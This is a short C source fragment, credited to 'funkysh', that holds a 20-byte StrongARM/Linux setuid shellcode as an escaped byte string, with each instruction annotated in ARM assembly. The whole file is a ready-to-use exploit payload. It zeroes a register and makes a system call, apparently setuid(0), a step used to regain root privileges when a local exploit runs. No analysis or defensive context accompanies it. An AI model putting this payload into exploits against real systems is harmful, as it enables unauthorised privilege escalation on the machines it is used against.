/*
 * 20 byte StrongARM/Linux setuid() shellcode
 * funkysh
 */

char shellcode[]= "\x02\x20\x42\xe0"   /*  sub   r2, r2, r2            */
                  "\x04\x10\x8f\xe2"   /*  add   r1, pc, #4            */
                  "\x12\x02\xa0\xe1"   /*  mov   r0, r2, lsl r2        */
                  "\x01\x20\xc1\xe5"   /*  strb  r2, [r1, #1]          */
                  "\x17\x0b\x90\xef";  /*  swi   0x90ff17              */